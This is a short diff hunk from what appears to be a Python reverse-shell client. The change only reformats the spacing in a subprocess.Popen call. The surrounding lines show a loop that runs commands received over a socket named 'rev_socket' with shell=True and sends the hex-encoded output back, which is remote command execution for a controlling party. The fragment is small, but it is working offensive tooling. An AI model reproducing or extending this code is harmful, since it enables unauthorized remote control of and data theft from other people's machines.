@@ -39,7 +39,7 @@ while True:
         rev_socket.send(hex_handler(os.getcwd(), encode=True))
         continue
 
-    output = subprocess.Popen(command, shell=True, stdout = subprocess.PIPE, stderr=subprocess.PIPE)
+    output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     stdout = output.stdout.read().decode()
     if stdout:
         rev_socket.send(hex_handler(stdout, encode=True))
